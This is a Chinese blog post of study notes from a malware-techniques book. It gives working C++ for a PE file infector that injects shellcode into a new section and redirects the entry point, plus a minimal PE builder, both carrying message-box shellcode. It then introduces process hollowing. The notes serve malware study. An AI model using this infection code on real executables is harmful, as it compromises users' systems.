<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>恶意程式前线战术指南笔记 | The Blog of Monoceros406</title><meta name="author" content="Monoceros406"><meta name="copyright" content="Monoceros406"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="恶意程式前线战术指南笔记档案映射PE蠕虫感染1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;iostream&gt;#include &lt;W">
<meta property="og:type" content="article">
<meta property="og:title" content="恶意程式前线战术指南笔记">
<meta property="og:url" content="https://monoceros406.github.io/2024/10/16/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%89%8D%E7%BA%BF%E6%88%98%E6%9C%AF%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="The Blog of Monoceros406">
<meta property="og:description" content="恶意程式前线战术指南笔记档案映射PE蠕虫感染1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;iostream&gt;#include &lt;W">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://monoceros406.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2024-10-16T11:07:12.000Z">
<meta property="article:modified_time" content="2025-05-11T01:58:28.608Z">
<meta property="article:author" content="Monoceros406">
<meta property="article:tag" content="恶意代码">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://monoceros406.github.io/img/avatar.jpg"><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://monoceros406.github.io/2024/10/16/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%89%8D%E7%BA%BF%E6%88%98%E6%9C%AF%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '恶意程式前线战术指南笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-05-11 09:58:28'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="The Blog of Monoceros406" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">318</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://t.alcy.cc/ycy')"><nav id="nav"><span id="blog-info"><a href="/" title="The Blog of Monoceros406"><span class="site-name">The Blog of Monoceros406</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">恶意程式前线战术指南笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-16T11:07:12.000Z" title="发表于 2024-10-16 19:07:12">2024-10-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-11T01:58:28.608Z" title="更新于 2025-05-11 09:58:28">2025-05-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="恶意程式前线战术指南笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="恶意程式前线战术指南笔记"><a href="#恶意程式前线战术指南笔记" class="headerlink" title="恶意程式前线战术指南笔记"></a>恶意程式前线战术指南笔记</h1><h2 id="档案映射"><a href="#档案映射" class="headerlink" title="档案映射"></a>档案映射</h2><h3 id="PE蠕虫感染"><a href="#PE蠕虫感染" class="headerlink" title="PE蠕虫感染"></a>PE蠕虫感染</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable : 4996)</span></span><br><span class="line"> <span class="comment">/* Title:           User32-free Messagebox Shellcode for All Windows</span></span><br><span class="line"><span class="comment">  * Author:           Giuseppe D&#x27;Amore</span></span><br><span class="line"><span class="comment">  * Size:            113 byte (NULL free)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="type">char</span> x86_nullfree_msgbox[] =</span><br><span class="line">    <span class="string">&quot;\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42&quot;</span></span><br><span class="line">    <span class="string">&quot;\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b&quot;</span></span><br><span class="line">    <span class="string">&quot;\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e&quot;</span></span><br><span class="line">    <span class="string">&quot;\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c&quot;</span></span><br><span class="line">    <span class="string">&quot;\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74&quot;</span></span><br><span class="line">    <span class="string">&quot;\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x0b\x31\xc0\x51\x50\xff\xd7&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">readBinFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span> fileName[], <span class="type">char</span>** bufPtr, DWORD&amp; length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (FILE* fp = <span class="built_in">fopen</span>(fileName, <span class="string">&quot;rb&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">        length = <span class="built_in">ftell</span>(fp);</span><br><span class="line">        *bufPtr = <span class="keyword">new</span> <span class="type">char</span>[length + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">        <span class="built_in">fread</span>(*bufPtr, <span class="built_in">sizeof</span>(<span class="type">char</span>), length, fp);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[!] usage: ./PE_Patcher.exe [path/to/file]&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span>* buff; DWORD fileSize;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">readBinFile</span>(argv[<span class="number">1</span>], &amp;buff, fileSize)) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[!] selected file not found.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)-&gt;e_lfanew))</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)getNtHdr(buf) + sizeof(IMAGE_NT_HEADERS)))</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] malloc memory for outputed *.exe file.&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> sectAlign = <span class="built_in">getNtHdr</span>(buff)-&gt;OptionalHeader.SectionAlignment, fileAlign = <span class="built_in">getNtHdr</span>(buff)-&gt;OptionalHeader.FileAlignment, finalOutSize = fileSize + <span class="built_in">P2ALIGNUP</span>(<span class="built_in">sizeof</span>(x86_nullfree_msgbox), fileAlign);</span><br><span class="line">    <span class="type">char</span>* outBuf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(finalOutSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(outBuf, buff, fileSize);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] create a new section to store shellcode.&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> sectArr = <span class="built_in">getSectionArr</span>(outBuf);</span><br><span class="line">    PIMAGE_SECTION_HEADER lastestSecHdr = &amp;sectArr[<span class="built_in">getNtHdr</span>(outBuf)-&gt;FileHeader.NumberOfSections - <span class="number">1</span>];</span><br><span class="line">    PIMAGE_SECTION_HEADER newSectionHdr = lastestSecHdr + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(newSectionHdr-&gt;Name, <span class="string">&quot;30cm.tw&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    newSectionHdr-&gt;Misc.VirtualSize = <span class="built_in">P2ALIGNUP</span>(<span class="built_in">sizeof</span>(x86_nullfree_msgbox), sectAlign);</span><br><span class="line">    newSectionHdr-&gt;VirtualAddress = <span class="built_in">P2ALIGNUP</span>((lastestSecHdr-&gt;VirtualAddress + lastestSecHdr-&gt;Misc.VirtualSize), sectAlign);</span><br><span class="line">    newSectionHdr-&gt;SizeOfRawData = <span class="built_in">sizeof</span>(x86_nullfree_msgbox);</span><br><span class="line">    newSectionHdr-&gt;PointerToRawData = lastestSecHdr-&gt;PointerToRawData + lastestSecHdr-&gt;SizeOfRawData;</span><br><span class="line">    newSectionHdr-&gt;Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;</span><br><span class="line">    <span class="built_in">getNtHdr</span>(outBuf)-&gt;FileHeader.NumberOfSections += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] pack x86 shellcode into new section.&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(outBuf + newSectionHdr-&gt;PointerToRawData, x86_nullfree_msgbox, <span class="built_in">sizeof</span>(x86_nullfree_msgbox));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] repair virtual size. (consider *.exe built by old compiler)&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; i &lt; <span class="built_in">getNtHdr</span>(outBuf)-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        sectArr[i - <span class="number">1</span>].Misc.VirtualSize = sectArr[i].VirtualAddress - sectArr[i - <span class="number">1</span>].VirtualAddress;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] fix image size in memory.&quot;</span>);</span><br><span class="line">    <span class="built_in">getNtHdr</span>(outBuf)-&gt;OptionalHeader.SizeOfImage = <span class="built_in">getSectionArr</span>(outBuf)[<span class="built_in">getNtHdr</span>(outBuf)-&gt;FileHeader.NumberOfSections - <span class="number">1</span>].VirtualAddress + <span class="built_in">getSectionArr</span>(outBuf)[<span class="built_in">getNtHdr</span>(outBuf)-&gt;FileHeader.NumberOfSections - <span class="number">1</span>].Misc.VirtualSize;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] point EP to shellcode.&quot;</span>);</span><br><span class="line">    <span class="built_in">getNtHdr</span>(outBuf)-&gt;OptionalHeader.AddressOfEntryPoint = newSectionHdr-&gt;VirtualAddress;</span><br><span class="line">    <span class="type">char</span> outputPath[MAX_PATH];</span><br><span class="line">    <span class="built_in">memcpy</span>(outputPath, argv[<span class="number">1</span>], <span class="built_in">sizeof</span>(outputPath));</span><br><span class="line">    <span class="built_in">strcpy</span>(<span class="built_in">strrchr</span>(outputPath, <span class="string">&#x27;.&#x27;</span>), <span class="string">&quot;_infected.exe&quot;</span>);</span><br><span class="line">    FILE* fp = <span class="built_in">fopen</span>(outputPath, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="built_in">fwrite</span>(outBuf, <span class="number">1</span>, finalOutSize, fp);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] file saved at %s\n&quot;</span>, outputPath);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] done.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="连结器"><a href="#连结器" class="headerlink" title="连结器"></a>连结器</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> file_align 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sect_align 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> P2ALIGNUP(size, align) ((((size) / align) + 1) * (align))</span></span><br><span class="line"><span class="type">char</span> x86_nullfree_msgbox[] =</span><br><span class="line">    <span class="string">&quot;\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42&quot;</span></span><br><span class="line">    <span class="string">&quot;\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b&quot;</span></span><br><span class="line">    <span class="string">&quot;\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e&quot;</span></span><br><span class="line">    <span class="string">&quot;\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c&quot;</span></span><br><span class="line">    <span class="string">&quot;\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74&quot;</span></span><br><span class="line">    <span class="string">&quot;\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x0b\x31\xc0\x51\x50\xff\xd7&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> peHeaderSize = <span class="built_in">P2ALIGNUP</span>(<span class="built_in">sizeof</span>(IMAGE_DOS_HEADER) + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER), file_align);</span><br><span class="line">    <span class="type">size_t</span> sectionDataSize = <span class="built_in">P2ALIGNUP</span>(<span class="built_in">sizeof</span>(x86_nullfree_msgbox), file_align);</span><br><span class="line">    <span class="type">char</span>* peData = (<span class="type">char</span>*)<span class="built_in">calloc</span>(peHeaderSize + sectionDataSize, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// DOS</span></span><br><span class="line">    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)peData;</span><br><span class="line">    dosHdr-&gt;e_magic = IMAGE_DOS_SIGNATURE; <span class="comment">// MZ</span></span><br><span class="line">    dosHdr-&gt;e_lfanew = <span class="built_in">sizeof</span>(IMAGE_DOS_HEADER);</span><br><span class="line">    <span class="comment">// NT</span></span><br><span class="line">    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(peData + dosHdr-&gt;e_lfanew);</span><br><span class="line">    ntHdr-&gt;Signature = IMAGE_NT_SIGNATURE; <span class="comment">// PE</span></span><br><span class="line">    ntHdr-&gt;FileHeader.Machine = IMAGE_FILE_MACHINE_I386;</span><br><span class="line">    ntHdr-&gt;FileHeader.Characteristics = IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_32BIT_MACHINE;</span><br><span class="line">    ntHdr-&gt;FileHeader.SizeOfOptionalHeader = <span class="built_in">sizeof</span>(IMAGE_OPTIONAL_HEADER);</span><br><span class="line">    ntHdr-&gt;FileHeader.NumberOfSections = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Section</span></span><br><span class="line">    PIMAGE_SECTION_HEADER sectHdr = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)ntHdr + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;(sectHdr-&gt;Name), <span class="string">&quot;30cm.tw&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    sectHdr-&gt;VirtualAddress = <span class="number">0x1000</span>;</span><br><span class="line">    sectHdr-&gt;Misc.VirtualSize = <span class="built_in">P2ALIGNUP</span>(<span class="built_in">sizeof</span>(x86_nullfree_msgbox), sect_align);</span><br><span class="line">    sectHdr-&gt;SizeOfRawData = <span class="built_in">sizeof</span>(x86_nullfree_msgbox);</span><br><span class="line">    sectHdr-&gt;PointerToRawData = peHeaderSize;</span><br><span class="line">    <span class="built_in">memcpy</span>(peData + peHeaderSize, x86_nullfree_msgbox, <span class="built_in">sizeof</span>(x86_nullfree_msgbox));</span><br><span class="line">    sectHdr-&gt;Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;</span><br><span class="line">    ntHdr-&gt;OptionalHeader.AddressOfEntryPoint = sectHdr-&gt;VirtualAddress;</span><br><span class="line">    ntHdr-&gt;OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR32_MAGIC;</span><br><span class="line">    ntHdr-&gt;OptionalHeader.BaseOfCode = sectHdr-&gt;VirtualAddress; <span class="comment">// .text RVA</span></span><br><span class="line">    ntHdr-&gt;OptionalHeader.BaseOfData = <span class="number">0x0000</span>;                  <span class="comment">// .data RVA</span></span><br><span class="line">    ntHdr-&gt;OptionalHeader.ImageBase = <span class="number">0x400000</span>;</span><br><span class="line">    ntHdr-&gt;OptionalHeader.FileAlignment = file_align;</span><br><span class="line">    ntHdr-&gt;OptionalHeader.SectionAlignment = sect_align;</span><br><span class="line">    ntHdr-&gt;OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;</span><br><span class="line">    ntHdr-&gt;OptionalHeader.SizeOfImage = sectHdr-&gt;VirtualAddress + sectHdr-&gt;Misc.VirtualSize;</span><br><span class="line">    ntHdr-&gt;OptionalHeader.SizeOfHeaders = peHeaderSize;</span><br><span class="line">    ntHdr-&gt;OptionalHeader.MajorSubsystemVersion = <span class="number">5</span>;</span><br><span class="line">    ntHdr-&gt;OptionalHeader.MinorSubsystemVersion = <span class="number">1</span>;</span><br><span class="line">    FILE* fp = <span class="built_in">fopen</span>(<span class="string">&quot;poc.exe&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="built_in">fwrite</span>(peData, peHeaderSize + sectionDataSize, <span class="number">1</span>, fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="Process-Hollowing"><a href="#Process-Hollowing" class="headerlink" title="Process Hollowing"></a>Process Hollowing</h3><p>越南国家级网军组织海莲花Ocean Lotus曾用过该技术。把一支具有数位签名的程式执行成进程，再将进程中已挂载的PE模组替换为恶意程式模组。PEB咨询体的ImageBaseAddress栏位储存主要执行程式的映像基址。此小节为x86工程。</p>
